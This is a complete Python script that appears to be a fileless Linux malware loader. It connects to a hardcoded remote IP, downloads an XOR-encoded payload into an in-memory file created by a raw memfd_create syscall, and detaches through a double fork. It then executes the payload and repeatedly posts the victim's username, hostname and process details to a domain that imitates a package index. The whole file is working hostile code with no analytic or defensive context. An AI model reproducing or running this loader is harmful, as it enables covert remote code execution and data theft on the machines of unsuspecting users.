import ctypes
import os
import requests
import socket
import sys
import time

def checkIn():
	data = {
	"action": "checkin",
	"user": os.getlogin(),
	"host": socket.gethostname(),
	"pid": os.getpid(),
	"architecture": "x64" if sys.maxsize > 2**32 else "x86",
	}

	res = requests.post(f"https://files.pypi-install.com/packages?name={os.getlogin()}@{socket.gethostname()}",json=data)
	if res.content != "Ok":
		return False
	else:
		return True

def run(fd):
	time.sleep(10)
	os.execl(f"/proc/self/fd/{fd}","sh")
	while(True):
		if checkIn(): os.execl(f"/proc/self/fd/{fd}","sh")

IP = "77.74.198.52"
PORT = 4443
ADDR = (IP, PORT)
SIZE = 1024


client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)
fd = ctypes.CDLL(None).syscall(319,"",1)

while(True):
	data = client.recv(SIZE)
	if not data: break
	for i in data:
		open(f"/proc/self/fd/{fd}","ab").write(bytes([i ^ 239]))

client.close()

fork1 = os.fork()
if 0 != fork1:
	os._exit(0)

os.chdir("/")
os.setsid(  )
os.umask(0)

fork2 = os.fork()
if 0 != fork2:
	sys.exit(0)

run(fd)